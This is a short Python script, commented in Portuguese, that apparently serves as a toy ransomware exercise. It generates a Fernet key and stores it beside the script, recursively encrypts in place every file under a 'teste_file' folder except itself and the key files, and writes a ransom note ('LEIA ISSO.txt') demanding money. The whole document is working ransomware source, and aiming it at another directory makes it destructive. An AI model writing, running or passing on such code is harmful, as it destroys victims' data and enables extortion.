from cryptography.fernet import Fernet
import os

# 1) Gerar chave de cripto
def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# 2) Carregar chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

# 3) criptografar arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# 4) Encontrar os arquivos para encriptografar
def encontrar_arquivios(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def criar_arquivo_mensagem():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados...")
        f.write("Enviar dim dim aí meu camarada")

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivios("teste_file")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_arquivo_mensagem()
    
if __name__=="__main__":
    main()